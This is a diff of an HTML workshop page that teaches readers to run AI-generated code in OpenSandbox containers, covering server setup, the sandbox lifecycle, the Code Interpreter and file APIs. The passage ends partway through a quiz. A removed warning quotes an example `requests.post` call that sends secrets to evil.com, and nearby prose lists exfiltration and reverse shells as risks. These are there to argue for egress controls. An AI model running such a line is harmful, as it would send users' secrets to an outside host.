@@ -771,24 +771,29 @@ body.track-audio { --accent: #6B5B95; --accent-hover: #574A7D; --accent-light: r
     
     <div class="session-hero">
       <div class="hero-tag">Workshop</div>
-      <h1>Give Your AI Agents a Safe Place to Run Wild</h1>
-      <div class="hero-subtitle">OpenSandbox is the missing infrastructure layer between &quot;my agent wrote some code&quot; and &quot;oh no it ran rm -rf on my machine&quot;</div>
+      <h1>Give Your AI Agents a Safe Place to Run Code</h1>
+      <div class="hero-subtitle">Set up Alibaba&#x27;s OpenSandbox to spin up isolated containers where agents can execute code without blowing up your machine</div>
       <div class="hero-meta">
         <span>35 min</span>
-        <span> <span class="tag">sandboxing</span> <span class="tag">code-execution</span> <span class="tag">agents</span> <span class="tag">docker</span> <span class="tag">kubernetes</span></span>
+        <span> <span class="tag">sandboxing</span> <span class="tag">agents</span> <span class="tag">code-execution</span> <span class="tag">docker</span> <span class="tag">kubernetes</span></span>
       </div>
     </div>
     <div class="context-block">
       <h2>What's happening</h2>
-      <p>Here&#x27;s the problem nobody talks about enough: your AI agents can <em>write</em> code all day long, but where do they <em>run</em> it?</p>
+      <p>Here&#x27;s the problem every agent builder eventually hits: your AI can <em>write</em> code, but where does it <em>run</em> it?</p>
 
-<p>If you&#x27;ve been building coding agents, eval harnesses, or any kind of AI-powered code execution pipeline, you&#x27;ve probably duct-taped something together with Docker containers, subprocess calls, and a prayer. Maybe you&#x27;ve used E2B or Modal, but those are hosted services — your code leaves your infrastructure.</p>
+<p>Letting an LLM execute arbitrary code on your actual machine is... let&#x27;s just say it&#x27;s a speedrun to a very bad day. You need a sandbox — an isolated throwaway environment where code can run, fail, even do weird stuff, and your host stays perfectly safe.</p>
 
-<p>Alibaba just open-sourced <strong>OpenSandbox</strong>, a self-hosted sandbox platform purpose-built for AI applications. It gives your agents isolated environments to execute code, manage files, and run interpreters — all behind a clean SDK that works in Python, JavaScript, Go, and more.</p>
+<p>Alibaba just open-sourced <strong>OpenSandbox</strong>, a platform designed exactly for this. It&#x27;s not the first sandbox tool out there (you might&#x27;ve seen E2B or Code Interpreter API), but it brings some interesting things to the table:</p>
 
-<p>The killer features: it runs on Docker locally or Kubernetes at scale, has built-in egress network controls (so your sandbox can&#x27;t phone home to sketchy servers), and provides a unified &quot;Sandbox Protocol&quot; that means you write your integration once and swap runtimes later.</p>
+<ul>
+<li><strong>Multi-language SDKs</strong> — Python, TypeScript, Java, C#, Go (coming soon). Not just a Python-only story.</li>
+<li><strong>Docker AND Kubernetes runtimes</strong> — run it locally on your laptop, or scale to hundreds of concurrent sandboxes on a cluster.</li>
+<li><strong>A unified &quot;Sandbox Protocol&quot;</strong> — lifecycle management, file operations, command execution, and a full Code Interpreter, all through one consistent API.</li>
+<li><strong>Built-in environments</strong> for coding agents, browser automation (Playwright, Chrome), and even desktop environments with VNC.</li>
+</ul>
 
-<p>Think of it like giving each AI agent their own little apartment. They can make a mess inside, but they can&#x27;t burn down the building.</p>
+<p>Today we&#x27;re going to get it running locally with Docker, spin up a Code Interpreter sandbox, execute some Python code through the SDK, and understand the mental model well enough that you could wire this into any agent system you&#x27;re building. Let&#x27;s get into it.</p>
     </div>
     <div class="step-section">
       <div class="step-header">
@@ -796,273 +801,256 @@ body.track-audio { --accent: #6B5B95; --accent-hover: #574A7D; --accent-light: r
         <h2>Get the Sandbox Server Running Locally</h2>
       </div>
       <div class="step-body">
-        <p>Before we do anything fancy, we need the sandbox server running on our machine. This is the &quot;landlord&quot; — it manages all the little apartments (sandboxes) our AI agents will live in.</p>
+        <p>Before we can run any code in a sandbox, we need the <em>server</em> — the thing that manages sandbox lifecycles, talks to Docker, and exposes the API that our SDK calls will hit.</p>
 
-<p>OpenSandbox uses Docker under the hood for local development. Each sandbox is basically a container with some extra orchestration on top. The server exposes an API that the SDKs talk to, so you never touch Docker directly.</p>
+<p>Think of it like this: OpenSandbox has a client-server architecture. The <strong>server</strong> is the bouncer at the club — it creates containers, watches them, tears them down when they&#x27;re done. The <strong>SDK</strong> is you outside the club, asking the bouncer to let your code in.</p>
 
-<p>The setup is refreshingly simple — it&#x27;s a Python package you install and a config file you generate. No Kubernetes cluster needed for local dev (though it supports K8s when you&#x27;re ready to scale).</p>
+<p>The server runs locally and talks to your Docker daemon. So step one: make sure Docker is running on your machine. (If you&#x27;re on Mac or Windows, Docker Desktop needs to be open. On Linux, the Docker service should be active.)</p>
+
+<p>Now, instead of memorizing install commands, let&#x27;s have our agent walk us through it.</p>
         
       <div class="agent-interaction">
         <div class="agent-goal">
           <div class="agent-goal-label">Ask your agent</div>
-          Get the agent to walk you through installing and starting the OpenSandbox server locally
+          Get the agent to give you a step-by-step local setup guide for OpenSandbox&#x27;s server using Docker
         </div>
         
         <div class="agent-hints">
           <div class="agent-hints-label">Think about it</div>
-          <ul><li>What are the prerequisites the agent needs to know about your system? (Docker, Python version, etc.)</li><li>Should the server run from a pip install or from source? What are the tradeoffs?</li><li>How will the server know what runtime to use — Docker vs Kubernetes?</li></ul>
+          <ul><li>What prerequisites does the server need? (Think about what runtime manages containers...)</li><li>There are two install paths — pip install vs cloning from source. Which is simpler for a first try?</li><li>The server needs a config file. What might need to go in a sandbox configuration?</li></ul>
         </div>
         
       <details class="reveal">
         <summary>What the agent gives back</summary>
-        <div class="reveal-body"><p>The agent should give you a short sequence of three commands: install the server package with <code>uv pip install opensandbox-server</code>, generate a Docker config with <code>opensandbox-server init-config ~/.sandbox.toml --example docker</code>, and start the server with <code>opensandbox-server</code>. It should mention that Docker needs to be running first, and that the config file at <code>~/.sandbox.toml</code> is where you&#x27;d tweak settings like timeouts and resource limits later.</p></div>
+        <div class="reveal-body"><p>The agent should walk you through three commands: installing the server package with <code>uv pip install opensandbox-server</code>, generating a config file with <code>opensandbox-server init-config ~/.sandbox.toml --example docker</code>, and then starting the server with <code>opensandbox-server</code>. It should mention that Docker must be running first, and that the config file at <code>~/.sandbox.toml</code> tells the server to use Docker as its runtime. If you want the from-source path instead, it&#x27;ll have you clone the repo, run <code>uv sync</code>, and copy <code>example.config.toml</code>.</p></div>
       </details>
       </div>
         
         
       <div class="callout callout-warning">
         <div class="callout-label">Warning</div>
-        Docker Desktop (or Docker Engine) must be running before you start the server. If you&#x27;re on macOS, make sure the Docker whale icon is in your menu bar. The server won&#x27;t give you a helpful error message if Docker is missing — it&#x27;ll just silently fail when you try to create sandboxes.
+        Docker must be running before you start the sandbox server. On Mac, make sure Docker Desktop is open (check the whale icon in your menu bar). The server talks directly to the Docker daemon — no daemon, no sandboxes.
       </div>
       <div class="callout callout-tip">
         <div class="callout-label">Tip</div>
-        The <code>--example docker</code> flag generates a config tuned for local development. There&#x27;s also <code>--example kubernetes</code> for production setups. You can always switch later — the SDK code stays the same.
+        The <code>uv</code> tool is a fast Python package manager from Astral (the Ruff folks). If you don&#x27;t have it, <code>pip install uv</code> or <code>curl -LsSf https://astral.sh/uv/install.sh | sh</code>. It&#x27;s dramatically faster than plain pip.
       </div>
         
       <details class="reveal">
+        <summary>What&#x27;s actually in that config file?</summary>
+        <div class="reveal-body"><p>The <code>~/.sandbox.toml</code> config tells the server which container runtime to use. The <code>--example docker</code> flag generates a config pre-filled for local Docker. If you were deploying to production, you&#x27;d swap this for a Kubernetes config instead — same server, different runtime backend.</p>
+
+<p>This is a nice design choice: your SDK code doesn&#x27;t change at all between local dev (Docker) and production (Kubernetes). The server handles that abstraction for you.</p></div>
+      </details>
+      <details class="reveal">
         <summary>Why not just use Docker directly?</summary>
-        <div class="reveal-body"><p>Great question. You <em>could</em> spin up Docker containers yourself, but OpenSandbox gives you three things raw Docker doesn&#x27;t:</p>
-
-<ol>
-<li><strong>Lifecycle management</strong> — automatic cleanup, timeouts, and resource limits so a runaway agent doesn&#x27;t eat your machine</li>
-<li><strong>A file system API</strong> — read/write files inside the sandbox without mounting volumes or using <code>docker cp</code></li>
-<li><strong>The code interpreter protocol</strong> — a standard way to execute code and get structured results back (stdout, stderr, return values, even charts)</li>
-</ol>
-
-<p>It&#x27;s the difference between driving a car and building a car from engine parts. Both get you there, but one is a lot less work.</p></div>
+        <div class="reveal-body"><p>You <em>could</em> just <code>docker run</code> containers yourself and exec into them. But OpenSandbox gives you: automatic cleanup (sandboxes have timeouts and get killed), a file API (read/write files without docker cp), structured output from code execution (not just raw stdout), and the Code Interpreter layer which handles things like preserving state between code executions. It&#x27;s the difference between raw sockets and an HTTP library — same underlying tech, much nicer interface.</p></div>
       </details>
       </div>
     </div>
     <div class="step-section">
       <div class="step-header">
         <div class="step-number">2</div>
-        <h2>Create Your First Sandbox and Run Code Inside It</h2>
+        <h2>Understand the Sandbox Lifecycle</h2>
       </div>
       <div class="step-body">
-        <p>Now for the fun part. We&#x27;re going to create a sandbox, run some commands inside it, and manage files — all through the Python SDK.</p>
+        <p>Before we write any SDK code, let&#x27;s build a mental model of how sandboxes work. This is the part that honestly confused me at first, because there are a few layers.</p>
 
-<p>Mentally, think of what we&#x27;re about to do in three layers:</p>
-<ul>
-<li><strong>Sandbox</strong> — the isolated container (the apartment)</li>
-<li><strong>Commands</strong> — shell commands you run inside it (like opening a terminal in the apartment)</li>
-<li><strong>Code Interpreter</strong> — a smarter layer that understands programming languages, captures return values, and handles things like matplotlib charts (like having a workbench in the apartment)</li>
-</ul>
+<p>Imagine a sandbox as a <strong>rented apartment</strong>:</p>
 
-<p>The SDK is async, which makes sense — you might want multiple sandboxes running at once, and you don&#x27;t want to block while waiting for code to execute.</p>
+<ol>
+<li><strong>Create</strong> — You sign the lease. A fresh Docker container spins up from an image. It&#x27;s empty, isolated, yours.</li>
+<li><strong>Use</strong> — You move in. You can run shell commands, read/write files, execute code. The apartment is fully furnished (the container image has Python, system tools, etc.).</li>
+<li><strong>Kill</strong> — Lease is up. The container is destroyed. Everything inside it vanishes. No cleanup needed.</li>
+</ol>
+
+<p>The key insight: sandboxes are <strong>ephemeral by design</strong>. They&#x27;re meant to be created, used for a task, and thrown away. Your agent might spin up dozens during a single session — one per code execution attempt, or one per user request. They&#x27;re cheap to create (a few seconds) and completely isolated from each other.</p>
+
+<p>Now there&#x27;s a layer <em>on top</em> of the raw sandbox: the <strong>Code Interpreter</strong>. Think of it as a tenant who already lives in the apartment. The sandbox gives you a container with shell access. The Code Interpreter gives you a <em>running Python/JS/etc. process</em> inside that container, with a REPL-like interface where you can send code and get structured results back (stdout, stderr, return values, even plots).</p>
+
+<p>Let&#x27;s get our agent to build us the SDK code that creates a sandbox and runs a basic command.</p>
         
       <div class="agent-interaction">
         <div class="agent-goal">
           <div class="agent-goal-label">Ask your agent</div>
-          Get the agent to build a Python script that creates a sandbox, runs a shell command, writes and reads a file, and then executes Python code through the code interpreter
+          Get the agent to explain the OpenSandbox Python SDK and build you a minimal script that creates a sandbox, runs a shell command, and cleans up
         </div>
         
         <div class="agent-hints">
           <div class="agent-hints-label">Think about it</div>
-          <ul><li>What image should the sandbox use? (Think about what comes pre-installed in a code interpreter image)</li><li>The SDK is async — what does that mean for how the script is structured?</li><li>What&#x27;s the difference between running a shell command vs. using the code interpreter?</li><li>How should the sandbox be cleaned up when we&#x27;re done?</li></ul>
+          <ul><li>The SDK package is called `opensandbox`. What&#x27;s the first thing you&#x27;d need to do with a sandbox? (Think lifecycle...)</li><li>Sandboxes are created from container images — what image should we use for a code interpreter?</li><li>These are async operations. What Python pattern handles async resource cleanup nicely?</li><li>What happens if your script crashes before cleanup? How should we protect against that?</li></ul>
         </div>
         
       <details class="reveal">
         <summary>What the agent gives back</summary>
-        <div class="reveal-body"><p>The agent should give you an async Python script that does five things in order: creates a sandbox from the <code>opensandbox/code-interpreter:v1.0.1</code> image, runs an <code>echo</code> command via <code>sandbox.commands.run()</code>, writes a file using <code>sandbox.files.write_files()</code>, reads it back, and then creates a <code>CodeInterpreter</code> to execute a Python snippet. The key insight is that <code>sandbox.commands.run()</code> is for raw shell commands, while <code>interpreter.codes.run()</code> understands programming languages and captures return values separately from stdout. The script should use <code>async with sandbox:</code> for automatic cleanup, or explicitly call <code>sandbox.kill()</code> at the end.</p></div>
+        <div class="reveal-body"><p>The agent should give you a short async Python script that does three things: creates a sandbox from the <code>opensandbox/code-interpreter:v1.0.1</code> image, runs a shell command like <code>echo &#x27;Hello OpenSandbox!&#x27;</code> and prints the output, then kills the sandbox. The important pattern to notice is <code>async with sandbox:</code> — this is a context manager that ensures the sandbox gets cleaned up even if something crashes. The agent should mention that <code>Sandbox.create()</code> takes the image name, an entrypoint, optional environment variables (like <code>PYTHON_VERSION</code>), and a timeout (how long the sandbox lives before auto-destruction).</p></div>
       </details>
       </div>
         
         
       <div class="callout callout-tip">
         <div class="callout-label">Tip</div>
-        The <code>async with sandbox:</code> context manager is your friend. It guarantees the sandbox gets killed even if your code throws an exception. Without it, orphaned containers will pile up and eat your disk space.
+        The <code>async with sandbox:</code> pattern is your best friend. It guarantees cleanup even if your code throws an exception. Never manage sandbox lifecycle manually unless you have a very specific reason.
       </div>
         
       <details class="reveal">
-        <summary>What&#x27;s the deal with the Code Interpreter vs. plain commands?</summary>
-        <div class="reveal-body"><p>This distinction tripped me up at first. Here&#x27;s the mental model:</p>
-
-<p><strong><code>sandbox.commands.run()</code></strong> is like SSHing into a machine and typing a command. You get stdout and stderr back as strings. It&#x27;s great for <code>pip install</code>, <code>ls</code>, <code>curl</code> — system-level stuff.</p>
-
-<p><strong><code>interpreter.codes.run()</code></strong> is like having a Jupyter notebook kernel running. It understands code cells, captures the <em>return value</em> of the last expression (not just what gets printed), and can handle rich output like charts and images. When you run <code>result = 2 + 2</code> followed by <code>result</code>, the code interpreter captures <code>4</code> as a structured result, not just a printed line.</p>
-
-<p>For AI agents that generate and execute code, the code interpreter is almost always what you want. It gives you cleaner, more structured output to feed back into the agent&#x27;s context.</p></div>
+        <summary>Why async? Can&#x27;t I just use regular Python?</summary>
+        <div class="reveal-body"><p>OpenSandbox&#x27;s Python SDK is async-first because sandbox operations involve network calls to the server and waiting for containers to start. In a real agent scenario, you might be managing multiple sandboxes concurrently (say, one per user), and async lets you do that efficiently without threading headaches. If you&#x27;re not comfortable with async Python, the good news is the pattern is always the same: <code>async def main()</code>, <code>await</code> the SDK calls, <code>asyncio.run(main())</code> at the bottom.</p></div>
       </details>
       <details class="reveal">
-        <summary>What languages does the code interpreter support?</summary>
-        <div class="reveal-body"><p>Out of the box, the code interpreter image supports Python (the <code>SupportedLanguage.PYTHON</code> enum). The architecture is extensible though — the Sandbox Protocol defines a standard interface, so community or custom interpreters for JavaScript, R, Julia, etc. can plug in. Python is the primary citizen here because, let&#x27;s be honest, that&#x27;s what 90% of AI-generated code is written in.</p></div>
+        <summary>What&#x27;s that entrypoint parameter doing?</summary>
+        <div class="reveal-body"><p>The <code>entrypoint=[&#x27;/opt/opensandbox/code-interpreter.sh&#x27;]</code> tells Docker what process to start inside the container. For the code interpreter image, this launches the interpreter service that listens for code execution requests. Without it, the container would start but wouldn&#x27;t know how to handle Code Interpreter SDK calls. Think of it as the difference between starting a computer (sandbox) and launching an application on it (code interpreter).</p></div>
       </details>
       </div>
     </div>
     <div class="checkpoint">
       <div class="checkpoint-icon">&#10003;</div>
-      <div>At this point you should have the OpenSandbox server running locally and a Python script that creates a sandbox, runs commands, manages files, and executes code through the interpreter. If your sandbox creation hangs, check that Docker is running and that the server is up (you should see logs in the server terminal).</div>
-    </div>
-    <div class="decision-point">
-      <h3>Quick Check</h3>
-      <div class="question">Your AI agent generates a Python script that needs to `pip install pandas` and then run a data analysis. How should you structure this in OpenSandbox?</div>
-      
-        <div class="decision-option">
-          <input type="radio" name="decision_5" id="decision_5_opt0">
-          <label for="decision_5_opt0">Use sandbox.commands.run() for pip install, then interpreter.codes.run() for the analysis</label>
-          <div class="decision-feedback correct">&#10003; Correct! Exactly right. Package installation is a system-level operation — it belongs in the shell via commands.run(). The actual data analysis benefits from the code interpreter&#x27;s structured output (return values, charts, etc.). This two-step pattern is the bread and butter of AI code execution: set up the environment with shell commands, then run the interesting code through the interpreter.</div>
-        </div>
-        <div class="decision-option">
-          <input type="radio" name="decision_5" id="decision_5_opt1">
-          <label for="decision_5_opt1">Put everything in one big interpreter.codes.run() call including the pip install</label>
-          <div class="decision-feedback incorrect">&#10007; Not quite. While this might technically work, it&#x27;s fragile. The code interpreter is designed for computational code, not system administration. pip install can produce noisy output that clutters your results, and if the install fails, it&#x27;s harder to distinguish from a code error. Keep environment setup in commands.run() and computation in the interpreter.</div>
-        </div>
-        <div class="decision-option">
-          <input type="radio" name="decision_5" id="decision_5_opt2">
-          <label for="decision_5_opt2">Build a custom Docker image with pandas pre-installed</label>
-          <div class="decision-feedback incorrect">&#10007; Not quite. This is actually a great optimization for production, but it&#x27;s overkill for our workshop and misses the point. In an agentic workflow, you often don&#x27;t know what packages the agent will need until it generates the code. The dynamic install approach (commands.run → interpreter.codes.run) handles that uncertainty. Save custom images for when you&#x27;ve stabilized your agent&#x27;s dependencies.</div>
-        </div>
+      <div>At this point you should have: (1) the OpenSandbox server running locally with Docker, and (2) a mental model of the sandbox lifecycle — create, use, kill. The server is your control plane, and sandboxes are ephemeral containers you spin up and throw away. If the server starts without errors and you can see it listening, you&#x27;re good to go.</div>
     </div>
     <div class="step-section">
       <div class="step-header">
         <div class="step-number">3</div>
-        <h2>Wire It Into an AI Agent Loop</h2>
+        <h2>Wire Up the Code Interpreter</h2>
       </div>
       <div class="step-body">
-        <p>Okay, here&#x27;s where it gets really interesting. So far we&#x27;ve been running code <em>we</em> wrote inside the sandbox. But the whole point of OpenSandbox is to let an <em>AI agent</em> generate and execute code safely.</p>
+        <p>Now we get to the fun part. The raw sandbox gives you shell commands and file operations — useful, but kind of like having a terminal. The <strong>Code Interpreter</strong> layer gives you something much richer: a persistent Python (or JavaScript, or other language) session where you can send code, get structured results, and even handle things like plots and data frames.</p>
 
-<p>The pattern is dead simple:</p>
-<ol>
-<li>User asks the agent a question that requires computation</li>
-<li>Agent generates Python code to answer it</li>
-<li>We run that code in a sandbox</li>
-<li>We feed the output back to the agent</li>
-<li>Agent interprets the results and responds to the user</li>
-</ol>
+<p>This is exactly what tools like ChatGPT&#x27;s Code Interpreter or Claude&#x27;s analysis tool are doing under the hood — running your code in an isolated environment and streaming back the results.</p>
 
-<p>This is the &quot;code interpreter&quot; pattern that made ChatGPT&#x27;s Advanced Data Analysis so powerful. But here, you own the infrastructure. Your data never leaves your servers. And you control exactly what the sandbox can access.</p>
+<p>Here&#x27;s the mental model: the Code Interpreter is a <strong>REPL session</strong> living inside your sandbox. It remembers variables between executions. If you run <code>x = 42</code> and then later run <code>print(x)</code>, it prints 42. State persists within a session, but vanishes when the sandbox dies.</p>
 
-<p>The sandwich looks like: <strong>LLM → generated code → sandbox execution → results → LLM → human-readable answer</strong>.</p>
+<p>The SDK for this is a separate package: <code>opensandbox-code-interpreter</code>. It wraps the sandbox and gives you a clean <code>interpreter.codes.run()</code> method.</p>
+
+<p>Let&#x27;s get our agent to build the full workflow.</p>
         
       <div class="agent-interaction">
         <div class="agent-goal">
           <div class="agent-goal-label">Ask your agent</div>
-          Get the agent to build a simple agent loop that takes a user question, asks an LLM to generate Python code, executes it in an OpenSandbox, and returns the result
+          Get the agent to build you a complete script that creates a sandbox, sets up a Code Interpreter inside it, executes Python code, and shows the result
         </div>
         
         <div class="agent-hints">
           <div class="agent-hints-label">Think about it</div>
-          <ul><li>What LLM will you use to generate the code? How should you prompt it to output *only* executable Python?</li><li>What happens if the generated code throws an error? How should the agent recover?</li><li>Should the sandbox persist between questions, or create a fresh one each time?</li><li>How do you prevent the LLM from generating malicious code? (Hint: the sandbox handles this, but think about what extra guardrails you might want)</li></ul>
+          <ul><li>You&#x27;ll need two SDK packages — one for the sandbox, one for the interpreter. What are they?</li><li>The Code Interpreter is created *from* an existing sandbox. What&#x27;s the relationship between them?</li><li>When running code, you need to specify the language. How would the SDK know which language to use?</li><li>The result object has both `result` (return value) and `logs` (stdout/stderr). Why both?</li></ul>
         </div>
         
       <details class="reveal">
         <summary>What the agent gives back</summary>
-        <div class="reveal-body"><p>The agent should give you a loop with three main pieces: (1) a system prompt that tells the LLM to output pure Python code when computation is needed, (2) a function that takes that generated code and runs it in an OpenSandbox code interpreter, and (3) a second LLM call that takes the execution results and turns them into a human-friendly answer. The key design decision is sandbox lifecycle — for a multi-turn conversation, keep the sandbox alive so variables and installed packages persist between turns. For one-shot questions, create and destroy per-query. The error handling should capture stderr from the sandbox and feed it back to the LLM for a retry.</p></div>
+        <div class="reveal-body"><p>The agent should give you a script that first creates a sandbox (same as before), then creates a Code Interpreter with <code>CodeInterpreter.create(sandbox)</code>, then runs Python code using <code>interpreter.codes.run(&#x27;your code here&#x27;, language=SupportedLanguage.PYTHON)</code>. The result comes back as a structured object — <code>result.result[0].text</code> gives you the return value of the last expression, and <code>result.logs.stdout[0].text</code> gives you anything that was printed. The key insight: the interpreter separates <em>return values</em> from <em>printed output</em>, which is way cleaner than just capturing stdout like a shell command would.</p></div>
       </details>
       </div>
         
         
       <div class="callout callout-tip">
         <div class="callout-label">Tip</div>
-        Keep the sandbox alive across a conversation session! If the user asks a follow-up question, their data and variables are still in memory. Create the sandbox when the conversation starts, kill it when it ends. This mimics how Jupyter notebooks work and feels natural to users.
+        The Code Interpreter&#x27;s <code>result</code> vs <code>logs</code> distinction is huge for agents. An agent can check the return value programmatically (was it an error? a number? a dataframe summary?) without having to parse messy stdout strings. This is what makes it better than just running <code>python -c &#x27;your code&#x27;</code> in a shell.
       </div>
       <div class="callout callout-warning">
         <div class="callout-label">Warning</div>
-        Never trust LLM-generated code. That&#x27;s the whole point of sandboxing. But also think about egress — OpenSandbox supports per-sandbox network policies so the generated code can&#x27;t exfiltrate data to external servers. Check the egress controls section in the docs if you&#x27;re handling sensitive data.
+        Don&#x27;t forget to install both packages: <code>opensandbox</code> (for sandbox management) AND <code>opensandbox-code-interpreter</code> (for the interpreter layer). They&#x27;re separate because you might want sandboxes without the interpreter — for example, if you&#x27;re doing browser automation or running shell scripts.
       </div>
         
       <details class="reveal">
-        <summary>The retry pattern — letting the agent fix its own bugs</summary>
-        <div class="reveal-body"><p>Here&#x27;s a trick that makes your agent dramatically more reliable: when the sandbox returns an error, feed the error message <em>back</em> to the LLM and ask it to fix the code.</p>
+        <summary>How does state persistence work across runs?</summary>
+        <div class="reveal-body"><p>When you call <code>interpreter.codes.run()</code> multiple times, each execution happens in the same Python process. Variables, imports, and function definitions from earlier runs are still available. This is crucial for agent workflows where the AI might say &quot;let me try a different approach&quot; — it can build on what it already set up.</p>
 
-<p>The loop looks like: generate → execute → error? → feed error back to LLM → regenerate → execute again. Cap it at 2-3 retries.</p>
-
-<p>This works shockingly well because LLMs are good at debugging when they can see the actual traceback. It&#x27;s like pair programming where your partner immediately sees the stack trace and goes &quot;oh, I forgot to import numpy.&quot;</p>
-
-<p>The sandbox makes this safe — each retry runs in the same isolated environment, so even if the LLM&#x27;s &quot;fix&quot; makes things worse, it can&#x27;t escape the container.</p></div>
+<p>But here&#x27;s the gotcha: if the <em>sandbox</em> dies (timeout, crash, explicit kill), everything is gone. State persists within a sandbox&#x27;s lifetime, not across sandboxes. If you need durable state, write it to a file and read it back in a new sandbox.</p></div>
+      </details>
+      <details class="reveal">
+        <summary>What languages does the Code Interpreter support?</summary>
+        <div class="reveal-body"><p>The <code>SupportedLanguage</code> enum includes Python and JavaScript at minimum. The image <code>opensandbox/code-interpreter:v1.0.1</code> comes pre-configured with Python (you can even set the version via the <code>PYTHON_VERSION</code> environment variable). Language support depends on the container image — the interpreter itself is language-agnostic, but the runtime needs the right toolchain installed. You could build a custom image with R, Julia, or anything else.</p></div>
       </details>
       </div>
     </div>
     <div class="step-section">
       <div class="step-header">
         <div class="step-number">4</div>
-        <h2>Network Policies and Security — The Boring-But-Critical Part</h2>
+        <h2>File Operations — Reading, Writing, and Moving Data</h2>
       </div>
       <div class="step-body">
-        <p>I know, I know — security isn&#x27;t the sexy part. But if you&#x27;re running AI-generated code, this is where OpenSandbox really earns its keep.</p>
+        <p>Real agent workflows don&#x27;t just run code in a vacuum. They need to get data <em>into</em> the sandbox, process it, and get results <em>out</em>. Maybe your agent needs to analyze a CSV, modify a config file, or generate a report.</p>
 
-<p>Think about what a malicious (or just confused) AI agent could do inside a container: download and run arbitrary binaries, exfiltrate your data to a remote server, mine crypto, or spin up a reverse shell. Traditional Docker containers don&#x27;t prevent any of this — they isolate the <em>filesystem</em> but not the <em>network</em>.</p>
+<p>OpenSandbox gives you a file API that works like a simple cloud storage interface:</p>
 
-<p>OpenSandbox has two layers of network control:</p>
+<ul>
+<li><strong>Write files</strong> into the sandbox (upload data for processing)</li>
+<li><strong>Read files</strong> from the sandbox (download results)</li>
+<li>Think of it as FTP for containers, but way simpler</li>
+</ul>
 
-<p><strong>Ingress Gateway</strong> — controls how traffic gets <em>into</em> your sandboxes. Supports multiple routing strategies so you can expose sandbox services (like a web app the agent built) without opening your whole network.</p>
+<p>This is the glue between your agent&#x27;s world (where it has user data, API responses, etc.) and the sandbox&#x27;s world (where code actually runs). Without this, the sandbox would be isolated in a bad way — safe, but useless.</p>
 
-<p><strong>Egress Controls</strong> — this is the big one. Per-sandbox rules for what external services the sandbox can talk to. You can allowlist specific domains (like <code>pypi.org</code> for pip installs) and block everything else.</p>
-
-<p>The mental model: ingress is the front door with a security guard. Egress is the phone line — you control who the sandbox can call.</p>
+<p>The pattern is always: write input files → run code that processes them → read output files.</p>
         
       <div class="agent-interaction">
         <div class="agent-goal">
           <div class="agent-goal-label">Ask your agent</div>
-          Get the agent to explain how to configure egress network policies for a sandbox that needs to install pip packages but shouldn&#x27;t be able to access anything else
+          Get the agent to show you how to write a file into a sandbox, process it with code, and read the result back out
         </div>
         
         <div class="agent-hints">
           <div class="agent-hints-label">Think about it</div>
-          <ul><li>What domains does pip actually need to reach? (It&#x27;s not just pypi.org)</li><li>Should you configure this at the server level or per-sandbox?</li><li>What&#x27;s the default policy — allow all or deny all? Which is safer for AI-generated code?</li></ul>
+          <ul><li>What method would you use to write files? What info does it need — path, content, permissions?</li><li>If you write a CSV into the sandbox, how would the Code Interpreter access it?</li><li>After the code generates output, how do you get that output file back to your host?</li><li>Think about file permissions — what mode should sandbox files have?</li></ul>
         </div>
         
       <details class="reveal">
         <summary>What the agent gives back</summary>
-        <div class="reveal-body"><p>The agent should explain that egress controls are configured in the <code>~/.sandbox.toml</code> config file or via the API when creating a sandbox. For a pip-only sandbox, you&#x27;d allowlist <code>pypi.org</code>, <code>files.pythonhosted.org</code>, and any mirrors you use, then deny everything else. The agent should note that the default is typically allow-all (for ease of development) and strongly recommend switching to deny-by-default for production. The config is straightforward — a list of allowed domains/IPs per sandbox template.</p></div>
+        <div class="reveal-body"><p>The agent should show you two key operations: writing files with <code>sandbox.files.write_files()</code> which takes a list of <code>WriteEntry</code> objects (each with a path, data, and mode like 644), and reading with <code>sandbox.files.read_file(&#x27;/path/to/file&#x27;)</code>. A practical example would be writing a CSV into the sandbox, running Python code in the interpreter that reads and processes it (using pandas or even just csv module), writing results to a new file, then reading that file back. The key insight is that the sandbox filesystem is completely separate from your host — files only get in or out through the SDK&#x27;s file API.</p></div>
       </details>
       </div>
         
         
-      <div class="callout callout-warning">
-        <div class="callout-label">Warning</div>
-        Default egress policy is allow-all. This is fine for local development but absolutely not okay for production. If an AI agent generates code that calls <code>requests.post(&#x27;https://evil.com&#x27;, data=your_secrets)</code>, nothing will stop it unless you configure egress rules.
-      </div>
       <div class="callout callout-tip">
         <div class="callout-label">Tip</div>
-        For agent evaluation and benchmarking, you often want NO network access at all. The agent&#x27;s code should work with the data already in the sandbox. A full network deny is the safest option for eval harnesses.
+        For larger files, think about whether you actually need to transfer the file out, or if you can just have the Code Interpreter compute a summary/result and return it directly via stdout. Transferring a 100MB dataset out of the sandbox is slower than having the interpreter compute the answer inside.
       </div>
         
       <details class="reveal">
-        <summary>Docker vs. Kubernetes runtime — when to graduate</summary>
-        <div class="reveal-body"><p>Docker runtime is perfect for:</p>
-<ul>
-<li>Local development</li>
-<li>Single-machine deployments</li>
-<li>Low-to-medium concurrency (dozens of sandboxes)</li>
-</ul>
+        <summary>How does this compare to Docker volumes?</summary>
+        <div class="reveal-body"><p>You might be thinking &quot;why not just mount a Docker volume?&quot; You could, but the file API is better for agent scenarios because:</p>
 
-<p>Kubernetes runtime is for when you need:</p>
-<ul>
-<li>Hundreds or thousands of concurrent sandboxes</li>
-<li>Auto-scaling based on demand</li>
-<li>Resource quotas and fair scheduling across teams</li>
-<li>High availability (sandbox server can restart without losing running sandboxes)</li>
-</ul>
+<ol>
+<li><strong>Security</strong> — Mounted volumes give the sandbox access to your host filesystem. The file API keeps the boundary strict — you explicitly choose what goes in and comes out.</li>
+<li><strong>Multi-tenant</strong> — If you&#x27;re running sandboxes for multiple users, volumes are a shared-state nightmare. The API keeps each sandbox&#x27;s files isolated.</li>
+<li><strong>Auditing</strong> — Every file transfer goes through the API, so you can log exactly what data entered and left the sandbox.</li>
+</ol>
 
-<p>The beautiful part is that your SDK code doesn&#x27;t change. You switch the server config from Docker to Kubernetes, and everything else stays the same. This is what the &quot;Sandbox Protocol&quot; abstraction buys you — runtime portability.</p>
-
-<p>Alibaba claims their K8s runtime is &quot;high-performance&quot; with sub-second sandbox creation. That matters when you&#x27;re running RL training loops that need thousands of sandboxes per hour.</p></div>
+<p>For local dev it doesn&#x27;t matter much, but in production this distinction is critical.</p></div>
       </details>
       </div>
     </div>
+    <div class="decision-point">
+      <h3>Quick Check</h3>
+      <div class="question">You&#x27;re building an agent that helps users debug Python code. The user pastes in buggy code, and your agent should run it, see the error, fix it, and return the working version. How should you structure the sandbox usage?</div>
+      
+        <div class="decision-option">
